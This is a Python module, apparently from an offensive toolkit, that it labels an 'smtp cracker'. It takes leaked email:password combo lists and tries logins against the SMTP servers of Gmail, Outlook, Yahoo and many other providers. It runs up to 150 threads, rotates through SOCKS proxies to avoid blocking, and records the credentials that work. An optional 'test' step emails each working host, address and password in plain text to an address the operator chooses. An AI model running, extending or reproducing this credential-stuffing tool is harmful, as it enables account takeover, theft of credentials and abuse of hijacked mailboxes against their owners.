# modules/smtp_checker.py
import smtplib
import socket
import ssl
import sys
import time
import re
import random
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from core.common import (
    banner, clear, session_dir, Writer, Stats, select_file,
    read_lines, norm_combo, dedupe, ask_threads, run_pool,
    Fore, Style, ROOT
)
from core.proxy import ProxyPool, load_pool_interactive

socket.setdefaulttimeout(5)

try:
    import dns.resolver
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

try:
    import socks
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

SMTP_TIMEOUT = 5
TEST_TIMEOUT = 5
MAX_CANDIDATES = 12

DOMAIN_MAP = {
    'gmail.com': ('smtp.gmail.com', [587, 465]),
    'googlemail.com': ('smtp.gmail.com', [587, 465]),
    'outlook.com': ('smtp.office365.com', [587]),
    'hotmail.com': ('smtp.office365.com', [587]),
    'live.com': ('smtp.office365.com', [587]),
    'msn.com': ('smtp.office365.com', [587]),
    'office365.com': ('smtp.office365.com', [587]),
    'zoho.com': ('smtp.zoho.com', [587, 465]),
    'zoho.eu': ('smtp.zoho.eu', [587, 465]),
    'yahoo.com': ('smtp.mail.yahoo.com', [587, 465]),
    'aol.com': ('smtp.aol.com', [587, 465]),
    'icloud.com': ('smtp.mail.me.com', [587]),
    'me.com': ('smtp.mail.me.com', [587]),
    'yandex.com': ('smtp.yandex.com', [587, 465]),
    'mail.ru': ('smtp.mail.ru', [587, 465]),
    'gmx.com': ('smtp.gmx.com', [587, 465]),
    'gmx.de': ('mail.gmx.net', [587, 465]),
    'web.de': ('smtp.web.de', [587, 465]),
    't-online.de': ('securesmtp.t-online.de', [587, 465]),
    'fastmail.com': ('smtp.fastmail.com', [587, 465]),
    'mail.com': ('smtp.mail.com', [587, 465]),
    'qq.com': ('smtp.qq.com', [587, 465]),
    '163.com': ('smtp.163.com', [587, 465]),
    '126.com': ('smtp.126.com', [587, 465]),
    'naver.com': ('smtp.naver.com', [587, 465]),
    'orange.fr': ('smtp.orange.fr', [587, 465]),
    'free.fr': ('smtp.free.fr', [587, 465]),
    'libero.it': ('smtp.libero.it', [587, 465]),
    'wp.pl': ('smtp.wp.pl', [587, 465]),
    'onet.pl': ('smtp.poczta.onet.pl', [587, 465]),
    'interia.pl': ('poczta.interia.pl', [587, 465]),
    'ukr.net': ('smtp.ukr.net', [587, 465]),
}

FALLBACK_HOSTS = [
    'smtp.office365.com', 'smtp.gmail.com', 'smtp.zoho.com',
    'smtppro.zoho.com', 'smtp.mail.yahoo.com', 'smtp.mail.me.com',
    'smtp.yandex.com', 'smtp.mail.ru', 'smtp.gmx.com', 'smtp.web.de',
    'smtp.fastmail.com', 'smtp.mail.com', 'smtp.ionos.com',
]

MX_CACHE = {}
MX_LOCK = threading.Lock()

def mx_hosts(domain):
    with MX_LOCK:
        if domain in MX_CACHE:
            return MX_CACHE[domain]
    hosts = []
    if HAS_DNS:
        try:
            ans = dns.resolver.resolve(domain, 'MX', lifetime=2)
            for r in ans:
                h = str(r.exchange).rstrip('.').lower()
                if h and h not in hosts:
                    hosts.append(h)
        except Exception:
            pass
    for g in (f"smtp.{domain}", f"mail.{domain}"):
        if g not in hosts:
            hosts.append(g)
    with MX_LOCK:
        MX_CACHE[domain] = hosts
    return hosts

CAND_CACHE = {}
CAND_LOCK = threading.Lock()

def candidates(email, forced_host=None, forced_port=None):
    if forced_host and forced_port:
        return [(forced_host, int(forced_port))]
    domain = email.split('@')[-1].lower()
    with CAND_LOCK:
        if domain in CAND_CACHE:
            return CAND_CACHE[domain]
    out, seen = [], set()

    def add(h, p):
        k = (h.lower(), p)
        if k not in seen and len(out) < MAX_CANDIDATES:
            seen.add(k)
            out.append((h, p))

    if domain in DOMAIN_MAP:
        h, ports = DOMAIN_MAP[domain]
        for p in ports:
            add(h, p)
    for h in mx_hosts(domain):
        for p in (587, 465):
            add(h, p)
    for h in FALLBACK_HOSTS:
        for p in (587, 465):
            add(h, p)

    with CAND_LOCK:
        CAND_CACHE[domain] = out
    return out

def _parse_proxy(proxy_url):
    if not proxy_url:
        return None
    m = re.match(r'^(http|https|socks4|socks5)://(?:([^:]+):([^@]+)@)?([^:]+):(\d+)$', proxy_url)
    if not m:
        return None
    scheme, user, pw, host, port = m.groups()
    return (host, int(port), user, pw, scheme.startswith('socks'))

def _connect(host, port, timeout, proxy_url):
    """
    Establish SMTP(S) connection. Returns (conn, proto) or (None, 'PROXY_FAIL').
    Uses SOCKS for SOCKS proxies; HTTP proxies are only used for a CONNECT tunnel
    which is not native to smtplib, so we fall through to direct if not SOCKS.
    """
    p = _parse_proxy(proxy_url) if proxy_url else None

    if p and p[4] and HAS_SOCKS:
        h, po, user, pw, _ = p
        try:
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, h, po, username=user, password=pw)
            sock.settimeout(timeout)
            sock.connect((host, port))
            if port == 465:
                conn = smtplib.SMTP_SSL(timeout=timeout)
                conn._host = host
                ctx = ssl.create_default_context()
                conn.sock = ctx.wrap_socket(sock, server_hostname=host)
                conn.file = conn.sock.makefile('rb')
                return conn, "SSL"
            conn = smtplib.SMTP(timeout=timeout)
            conn.sock = sock
            conn.file = sock.makefile('rb')
            return conn, "PLAIN"
        except Exception:
            return None, "PROXY_FAIL"

    # direct (HTTP proxies are not usable for raw TCP)
    try:
        if port == 465:
            return smtplib.SMTP_SSL(host, port, timeout=timeout), "SSL"
        return smtplib.SMTP(host, port, timeout=timeout), "PLAIN"
    except Exception:
        return None, "FAIL"

def try_login(host, port, email, password, proxy_url=None):
    conn, proto = _connect(host, port, SMTP_TIMEOUT, proxy_url)
    if not conn:
        return False, proto

    try:
        conn.ehlo_or_helo_if_needed()
        if port == 587 and conn.has_extn('starttls'):
            try:
                conn.starttls(context=ssl.create_default_context())
                conn.ehlo()
                proto = "STARTTLS"
            except Exception:
                pass
        conn.login(email, password)
        try:
            conn.quit()
        except Exception:
            pass
        return True, proto
    except smtplib.SMTPAuthenticationError:
        try: conn.quit()
        except Exception: pass
        return False, "AUTH_FAIL"
    except Exception:
        try: conn.quit()
        except Exception: pass
        return False, "NONE"

def send_test(host, port, email, password, proto, recipient, proxy_url=None):
    try:
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = recipient
        msg['Subject'] = "smtp test"
        body = (f"server {host}:{port}\nproto {proto}\nemail {email}\npass {password}\n")
        msg.attach(MIMEText(body, 'plain'))

        conn, _ = _connect(host, port, TEST_TIMEOUT, proxy_url)
        if not conn:
            return False
        try:
            conn.ehlo_or_helo_if_needed()
            if port == 587 or proto == "STARTTLS":
                try:
                    conn.starttls(context=ssl.create_default_context())
                    conn.ehlo()
                except Exception:
                    try: conn.quit()
                    except Exception: pass
                    return False
            conn.login(email, password)
            conn.send_message(msg)
            try: conn.quit()
            except Exception: pass
            return True
        except Exception:
            try: conn.quit()
            except Exception: pass
            return False
    except Exception:
        return False

def worker(combo, test_to, stats, writer, forced, pool: ProxyPool):
    try:
        email, password = combo.split(':', 1)
    except ValueError:
        stats.add("errors"); stats.add("checked"); return

    fh, fp = forced if forced else (None, None)

    for host, port in candidates(email, fh, fp):
        proxy_url = pool.get() if len(pool) else None
        ok, proto = try_login(host, port, email, password, proxy_url)

        if proto == "PROXY_FAIL":
            if proxy_url:
                pool.mark_fail(proxy_url)
            continue

        if ok:
            if proxy_url:
                pool.mark_ok(proxy_url)
            stats.add("valid")
            line = f"{host}|{port}|{email}|{password}"
            writer.write("Valid_Smtp.txt", line)

            if test_to:
                sent = send_test(host, port, email, password, proto, test_to, proxy_url)
                if sent:
                    stats.add("test_sent")
                    writer.write("test_sent.txt", line)
                else:
                    stats.add("test_failed")
                    writer.write("test_failed.txt", line)
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {host}:{port} {email} "
                      f"{Fore.LIGHTBLACK_EX}| {'sent' if sent else 'test failed'}{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {host}:{port} {email} "
                      f"{Fore.LIGHTBLACK_EX}| {proto}{Style.RESET_ALL}")
            stats.add("checked")
            return

        if proto == "AUTH_FAIL":
            break

    stats.add("invalid")
    stats.add("checked")
    print(f"{Fore.RED}[-]{Style.RESET_ALL} {email}")

def parse_combo_line(line):
    if '|' in line:
        p = line.split('|')
        if len(p) >= 4:
            return (f"{p[2].strip()}:{p[3].strip()}", (p[0].strip(), p[1].strip()))
    if ':' in line:
        p = line.split(':')
        if len(p) >= 5 and p[3].strip().isdigit():
            return (f"{p[0].strip()}:{p[1].strip()}", (p[2].strip(), p[3].strip()))
    c = norm_combo(line)
    return (c, None) if c else (None, None)

def main():
    clear()
    banner("smtp cracker")

    path = select_file("select combo file (email:pass or host|port|email|pass)")
    if not path:
        print(f"{Fore.RED}[!] no file{Style.RESET_ALL}"); input("enter..."); return

    combos, forced_map = [], {}
    for line in read_lines(path):
        c, forced = parse_combo_line(line)
        if c:
            combos.append(c)
            if forced:
                forced_map[c] = forced

    combos, dupes = dedupe(combos)
    if not combos:
        print(f"{Fore.RED}[!] no valid combos{Style.RESET_ALL}"); input("enter..."); return

    test_to = input(f"{Fore.CYAN}[?] test recipient email (blank = skip): {Style.RESET_ALL}").strip()
    if test_to and not ('@' in test_to and '.' in test_to):
        print(f"{Fore.YELLOW}[!] invalid email, skipping test sends{Style.RESET_ALL}")
        test_to = None

    pool = load_pool_interactive()
    threads = ask_threads(150)

    out = session_dir("smtp")
    writer = Writer(out)
    stats = Stats(total=len(combos), keys=["test_sent", "test_failed"])

    print(f"{Fore.CYAN}[*] combos {len(combos)} | dupes {dupes} | threads {threads} "
          f"| proxies {len(pool)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] results -> {out}{Style.RESET_ALL}\n")

    run_pool(combos,
             lambda c: worker(c, test_to, stats, writer, forced_map.get(c), pool),
             threads, stats, name="smtp")

    writer.close()
    print(f"\n{Fore.GREEN}[+] done | valid {stats.get('valid')} | sent {stats.get('test_sent')} "
          f"| failed {stats.get('test_failed')} | invalid {stats.get('invalid')}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] {out}{Style.RESET_ALL}")
    input("enter...")

if __name__ == "__main__":
    main()
